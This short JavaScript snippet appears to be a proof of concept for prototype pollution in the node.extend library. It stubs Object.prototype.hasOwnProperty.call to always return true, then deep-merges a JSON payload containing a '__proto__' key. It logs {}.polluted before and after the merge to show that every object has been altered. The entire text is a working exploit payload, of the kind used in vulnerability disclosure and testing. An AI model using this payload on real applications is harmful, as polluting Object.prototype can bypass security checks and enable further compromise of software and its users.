Object.prototype.hasOwnProperty.call = () => true;
let extend = require('node.extend');
var obj = {};
console.log({}.polluted);
extend(true, {}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);